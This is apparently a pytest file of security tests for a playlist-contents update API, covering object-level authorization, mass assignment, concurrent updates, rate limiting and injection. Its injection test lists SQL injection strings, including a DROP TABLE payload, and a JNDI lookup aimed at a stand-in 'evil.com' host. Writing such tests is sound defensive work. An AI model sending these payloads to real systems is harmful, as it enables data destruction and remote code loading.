"""Red Team security tests for PlaylistContents UPDATE endpoint (T230).

Tests focus on:
- API1:2023 BOLA (updating other's content)
- API3:2023 BOPLA (mass assignment on update)
- API6:2023 Resource consumption (mass updates)
- Race conditions on concurrent updates
- Injection in update payloads
"""

import json
import time

from concurrent.futures import ThreadPoolExecutor

import pytest

from model_bakery import baker

from api.core.models import User
from api.schedule.models import (
    Playlist,
    PlaylistContent,
    SmartBlock,
    Webstream,
)
from api.storage.models import File


@pytest.mark.django_db(transaction=True)
class TestPlaylistContentUpdateRedTeam:
    """Red Team tests for PATCH/PUT /api/v2/playlist-contents/{id}."""

    def setup_method(self):
        """Clean up before each test."""
        PlaylistContent.objects.all().delete()
        Playlist.objects.all().delete()
        File.objects.all().delete()
        Webstream.objects.all().delete()
        SmartBlock.objects.all().delete()
        User.objects.filter(username__startswith="testred").delete()

    # ========================================================================
    # API1:2023 - BOLA
    # ========================================================================

    @pytest.mark.xfail(reason="T420: BOLA - can update other's content")
    def test_bola_update_other_users_content(self, api_client):
        """BOLA: Should not update another user's playlist content."""
        victim = baker.make(User, username="testred_victim")
        victim_playlist = baker.make(Playlist, name="Victim", owner=victim)
        victim_file = baker.make(
            File,
            name="victim.mp3",
            mime="audio/mp3",
            owner=victim,
        )
        content = baker.make(
            PlaylistContent,
            playlist=victim_playlist,
            kind=PlaylistContent.Kind.FILE,
            file=victim_file,
            position=1,
        )

        response = api_client.patch(
            f"/api/v2/playlist-contents/{content.id}",
            json.dumps({"position": 99}),
            content_type="application/json",
        )

        assert response.status_code in [
            403,
            404,
        ], f"BOLA: Updated victim's content with {response.status_code}"

    @pytest.mark.xfail(
        reason="T420: BOLA - can move content to other's playlist",
    )
    def test_bola_move_content_to_other_playlist(self, api_client):
        """BOLA: Should not move content to another user's playlist."""
        user = baker.make(User, username="testred_user")
        victim = baker.make(User, username="testred_victim")

        user_playlist = baker.make(Playlist, name="User", owner=user)
        victim_playlist = baker.make(Playlist, name="Victim", owner=victim)

        file_obj = baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            owner=user,
        )
        content = baker.make(
            PlaylistContent,
            playlist=user_playlist,
            kind=PlaylistContent.Kind.FILE,
            file=file_obj,
            position=1,
        )

        # Try to move content to victim's playlist
        response = api_client.patch(
            f"/api/v2/playlist-contents/{content.id}",
            json.dumps({"playlist": victim_playlist.id}),
            content_type="application/json",
        )

        assert response.status_code in [
            403,
            400,
        ], f"BOLA: Moved content to victim's playlist with {response.status_code}"

    # ========================================================================
    # API3:2023 - BOPLA
    # ========================================================================

    @pytest.mark.xfail(
        reason="T425: Mass assignment - id modification allowed",
    )
    def test_bopla_update_id_field(self, api_client):
        """BOPLA: Should not allow modifying id field."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(Playlist, name="Test", owner=user)
        file_obj = baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            owner=user,
        )
        content = baker.make(
            PlaylistContent,
            playlist=playlist,
            kind=PlaylistContent.Kind.FILE,
            file=file_obj,
            position=1,
        )
        original_id = content.id

        response = api_client.patch(
            f"/api/v2/playlist-contents/{content.id}",
            json.dumps({"id": 99999}),
            content_type="application/json",
        )

        # Refresh from db
        content.refresh_from_db()
        assert content.id == original_id, "BOPLA: ID was modified"

    # ========================================================================
    # Race Conditions
    # ========================================================================

    def test_race_condition_concurrent_updates(self, api_client):
        """Race: Concurrent updates to same content."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(Playlist, name="Test", owner=user)
        file_obj = baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            owner=user,
        )
        content = baker.make(
            PlaylistContent,
            playlist=playlist,
            kind=PlaylistContent.Kind.FILE,
            file=file_obj,
            position=1,
        )

        def update_position(pos):
            return api_client.patch(
                f"/api/v2/playlist-contents/{content.id}",
                json.dumps({"position": pos}),
                content_type="application/json",
            )

        # Fire concurrent updates
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(update_position, i) for i in range(5)]
            responses = [f.result() for f in futures]

        # All should succeed or some may fail, but no corruption
        success_count = sum(1 for r in responses if r.status_code == 200)
        assert success_count >= 1, "All concurrent updates failed"

    # ========================================================================
    # Injection
    # ========================================================================

    def test_update_sql_injection_in_fields(self, api_client):
        """SQLi: Injection in update fields."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(Playlist, name="Test", owner=user)
        file_obj = baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            owner=user,
        )
        content = baker.make(
            PlaylistContent,
            playlist=playlist,
            kind=PlaylistContent.Kind.FILE,
            file=file_obj,
            position=1,
        )

        sqli_payloads = [
            "1' OR '1'='1",
            "'; DROP TABLE users;--",
            "${jndi:ldap://evil.com}",
        ]

        for payload in sqli_payloads:
            response = api_client.patch(
                f"/api/v2/playlist-contents/{content.id}",
                json.dumps({"cue_in": payload}),
                content_type="application/json",
            )
            assert response.status_code in [
                200,
                400,
            ], f"SQLi caused {response.status_code}"

    # ========================================================================
    # Validation
    # ========================================================================

    @pytest.mark.xfail(reason="T423: No validation of negative position")
    def test_update_negative_position(self, api_client):
        """Validation: Negative position should be rejected."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(Playlist, name="Test", owner=user)
        file_obj = baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            owner=user,
        )
        content = baker.make(
            PlaylistContent,
            playlist=playlist,
            kind=PlaylistContent.Kind.FILE,
            file=file_obj,
            position=1,
        )

        response = api_client.patch(
            f"/api/v2/playlist-contents/{content.id}",
            json.dumps({"position": -1}),
            content_type="application/json",
        )

        assert (
            response.status_code == 400
        ), f"Negative position accepted with {response.status_code}"

    def test_update_nonexistent_content(self, api_client):
        """Validation: Update non-existent content should return 404."""
        response = api_client.patch(
            "/api/v2/playlist-contents/999999",
            json.dumps({"position": 1}),
            content_type="application/json",
        )
        assert response.status_code == 404

    # ========================================================================
    # Resource Consumption
    # ========================================================================

    def test_update_rapid_fire(self, api_client):
        """Resource: Rapid updates should be rate limited."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(Playlist, name="Test", owner=user)
        file_obj = baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            owner=user,
        )
        content = baker.make(
            PlaylistContent,
            playlist=playlist,
            kind=PlaylistContent.Kind.FILE,
            file=file_obj,
            position=1,
        )

        start = time.time()
        responses = []
        for i in range(20):
            r = api_client.patch(
                f"/api/v2/playlist-contents/{content.id}",
                json.dumps({"position": i}),
                content_type="application/json",
            )
            responses.append(r)
        elapsed = time.time() - start

        success = sum(1 for r in responses if r.status_code == 200)
        if elapsed < 2 and success == 20:
            pass  # No rate limiting detected

    # ========================================================================
    # Mass Assignment
    # ========================================================================

    def test_mass_assignment_readonly_fields(self, api_client):
        """BOPLA: Try to update read-only/system fields."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(Playlist, name="Test", owner=user)
        file_obj = baker.make(
            File,
            name="test.mp3",
            mime="audio/mp3",
            owner=user,
        )
        content = baker.make(
            PlaylistContent,
            playlist=playlist,
            kind=PlaylistContent.Kind.FILE,
            file=file_obj,
            position=1,
        )

        # Try to set various protected fields
        protected_fields = [
            {"created_at": "2020-01-01T00:00:00Z"},
            {"updated_at": "2020-01-01T00:00:00Z"},
        ]

        for fields in protected_fields:
            response = api_client.patch(
                f"/api/v2/playlist-contents/{content.id}",
                json.dumps(fields),
                content_type="application/json",
            )
            # Should ignore or reject
            assert response.status_code in [
                200,
                400,
            ], f"Protected fields update returned {response.status_code}"
